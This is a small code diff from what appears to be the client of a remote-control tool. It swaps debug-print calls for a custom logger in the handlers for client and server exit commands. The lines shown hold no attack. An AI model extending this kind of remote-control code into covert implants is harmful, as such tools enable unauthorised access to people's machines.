@@ -196,7 +196,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			BYTE	bToken = COMMAND_BYE;// 被控端退出
 			m_ClientObject->OnServerSending((char*)&bToken, 1);
 			g_bExit = S_CLIENT_EXIT;
-			OutputDebugStringA("======> Client exit \n");
+			Mprintf("======> Client exit \n");
 			break;
 		}
 
@@ -205,7 +205,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 			BYTE	bToken = SERVER_EXIT;// 主控端退出  
 			m_ClientObject->OnServerSending((char*)&bToken, 1);
 			g_bExit = S_SERVER_EXIT;
-			OutputDebugStringA("======> Server exit \n");
+			Mprintf("======> Server exit \n");
 			break;
 		}
 
